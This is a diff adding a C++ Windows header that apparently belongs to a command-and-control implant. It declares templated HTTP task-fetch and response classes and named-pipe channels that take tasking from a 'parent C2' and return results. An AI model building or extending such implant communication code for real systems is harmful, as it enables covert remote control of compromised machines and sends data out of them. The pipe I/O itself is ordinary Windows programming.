@@ -1,0 +1,249 @@
+#pragma once
+#include <windows.h>
+#include <string>
+#include <vector>
+#include "protocols/json/json.h"
+#include "core/settings.h"
+#include "comms/smb.h"
+#include "data/transforms/transforms.h"
+
+// ==========================================================
+// BASE INTERFACES
+// ==========================================================
+
+//base class to derive each transport method off of. tldr, it's more boilerplate code to do this,
+// but makes it easier IMO to track/structure. 
+class IIngressTransport {
+public:
+    virtual ~IIngressTransport() = default;
+    // our "sleep" function, or what to wait for. 
+    // Universal for a sleep time, or someting like a pipe that waits
+    virtual HANDLE get_wait_handle() = 0; 
+    //func to get our task
+    virtual nlohmann::json fetch_task(const std::string& uuid) = 0;
+};
+
+class IEgressTransport {
+public:
+    virtual ~IEgressTransport() = default;
+    //func to send response
+    virtual void send_response(const std::string& uuid, std::vector<uint8_t> task_response_msgpack_list) = 0;
+};
+
+// ==========================================================
+// 2. HTTP IMPLEMENTATIONS (Amazon Profile)
+// ==========================================================
+
+// Forward declarations of GET functions from comms.cpp
+
+[%- for c2_get_profile in get_function_mappings.values() %]
+
+nlohmann::json [[ c2_get_profile.value]](std::string implant_uuid);
+
+[%- endfor %]
+
+// Forward declarations of POST functions from comms.cpp
+
+[%- for c2_post_profile in post_function_mappings.values() %]
+
+int [[ c2_post_profile.value]](std::string implant_uuid, std::vector<uint8_t> task_response_msgpack_list);
+
+[%- endfor %]
+
+
+//Declare classes for each comms type
+
+[%- for c2_get_profile in get_function_mappings.values() %]
+
+class [[ c2_get_profile.value ]]_class : public IIngressTransport {
+public:
+    //return NULL on non pipe/handle returning transport methods.
+    //parent loop handles this by reverting to a wait for single, which waits
+    //for the worker.
+    HANDLE get_wait_handle() override {
+        return NULL;
+    }
+    nlohmann::json fetch_task(const std::string& uuid) override {
+        return [[ c2_get_profile.value ]](uuid);
+    }
+};
+
+[%- endfor %]
+
+[%- for c2_post_profile in post_function_mappings.values() %]
+
+class [[ c2_post_profile.value ]]_class : public IEgressTransport {
+public:
+    void send_response(const std::string& uuid, std::vector<uint8_t> task_response_msgpack_list) override {
+        [[ c2_post_profile.value ]](uuid, task_response_msgpack_list);
+    }
+};
+
+[%- endfor %]
+
+
+/* endtemplate */
+
+
+//later
+// // ==========================================================
+// // 3. PIPE IMPLEMENTATIONS (SMB Profile)
+// // ==========================================================
+
+//hardcoded, for dev
+
+class PipeIngress : public IIngressTransport {
+private:
+    HANDLE h_inbox_;
+    OVERLAPPED ol_;
+    HANDLE h_event_;
+
+    // The buffer MUST be a class member so it stays alive while Windows 
+    // writes to it in the background during the cycle() wait.
+    std::vector<uint8_t> async_buffer_;
+    bool is_reading_;
+
+    // Helper to kick off the background read
+    void arm_next_read() {
+        if (is_reading_) return;
+
+        DWORD bytes_read = 0;
+        memset(async_buffer_.data(), 0, async_buffer_.size()); // Clear old data
+
+        // Issue the async read
+        BOOL success = ReadFile(
+            h_inbox_,
+            async_buffer_.data(),
+            static_cast<DWORD>(async_buffer_.size()),
+            &bytes_read,
+            &ol_
+        );
+
+        if (!success && GetLastError() == ERROR_IO_PENDING) {
+            // Perfect. Windows is reading in the background. 
+            // The ol_.hEvent will signal when it's done.
+            is_reading_ = true;
+        }
+        else if (success) {
+            // Data was instantly available. The event is already signaled.
+            is_reading_ = true;
+        }
+        else {
+            // Pipe broken or parent disconnected
+            std::cerr << "[-] Pipe read error: " << GetLastError() << std::endl;
+        }
+    }
+
+public:
+    PipeIngress(HANDLE h) : h_inbox_(h), is_reading_(false) {
+        memset(&ol_, 0, sizeof(OVERLAPPED));
+        h_event_ = CreateEventW(NULL, TRUE, FALSE, NULL);
+        ol_.hEvent = h_event_;
+
+        // Pre-allocate a large enough buffer (e.g., 1mb)
+        async_buffer_.resize(1024 * 1024);
+
+        // KICK OFF THE FIRST READ so the cycle() loop has something to wait for
+        arm_next_read();
+    }
+
+    ~PipeIngress() {
+        if (h_event_) CloseHandle(h_event_);
+    }
+
+    HANDLE get_wait_handle() override {
+        return h_event_;
+    }
+
+    nlohmann::json fetch_task(const std::string& uuid) override {
+        // If we are here, WaitForMultipleObjects signaled that our read finished!
+        DWORD bytes_transferred = 0;
+
+        // Get the actual result of the read we kicked off earlier
+        if (!GetOverlappedResult(h_inbox_, &ol_, &bytes_transferred, FALSE)) {
+            // Parent disconnected or pipe error
+            ResetEvent(h_event_);
+            is_reading_ = false;
+            return nlohmann::json();
+        }
+
+        // We have our data! 
+        std::vector<uint8_t> raw_data(async_buffer_.begin(), async_buffer_.begin() + bytes_transferred);
+
+        // Reset the event and arm the NEXT read immediately so we don't miss incoming data
+        ResetEvent(h_event_);
+        is_reading_ = false;
+        arm_next_read();
+
+        // Parse and return
+        if (raw_data.empty()) {
+            return nlohmann::json();
+        }
+
+        try {
+            return nlohmann::json::from_msgpack(raw_data);
+        }
+        catch (...) {
+            return nlohmann::json();
+        }
+    }
+};
+
+
+class PipeEgress : public IEgressTransport {
+private:
+    HANDLE h_outbox_;
+    OVERLAPPED ol_;
+    HANDLE h_event_;
+
+public:
+    PipeEgress(HANDLE h) : h_outbox_(h) {
+        memset(&ol_, 0, sizeof(OVERLAPPED));
+        h_event_ = CreateEventW(NULL, TRUE, FALSE, NULL);
+        ol_.hEvent = h_event_;
+    }
+
+    ~PipeEgress() {
+        if (h_event_) CloseHandle(h_event_);
+    }
+
+    void send_response(const std::string& uuid, std::vector<uint8_t> batched_data) override {
+        if (batched_data.empty() || h_outbox_ == INVALID_HANDLE_VALUE) {
+            return;
+        }
+
+        DWORD bytes_written = 0;
+        ResetEvent(h_event_);
+
+        // 1. Issue the asynchronous write
+        BOOL success = WriteFile(
+            h_outbox_,
+            batched_data.data(),
+            static_cast<DWORD>(batched_data.size()),
+            &bytes_written,
+            &ol_
+        );
+
+        // 2. Handle the Overlapped state
+        if (!success && GetLastError() == ERROR_IO_PENDING) {
+            // CRITICAL: The 4th parameter is TRUE.
+            // This blocks the thread just long enough for Windows to finish copying
+            // batched_data to the kernel. This prevents the vector from being destroyed
+            // while Windows is still trying to read it.
+            if (!GetOverlappedResult(h_outbox_, &ol_, &bytes_written, TRUE)) {
+                std::cerr << "[-] Pipe write failed after pending: " << GetLastError() << std::endl;
+            }
+            else {
+                std::cout << "[+] Asynchronously sent " << bytes_written << " bytes." << std::endl;
+            }
+        }
+        else if (!success) {
+            // Pipe broke or parent C2 disconnected
+            std::cerr << "[-] Immediate pipe write error: " << GetLastError() << std::endl;
+        }
+        else {
+            // Success immediately (buffer was small enough to write instantly)
+            std::cout << "[+] Instantly sent " << bytes_written << " bytes." << std::endl;
+        }
+    }
+};
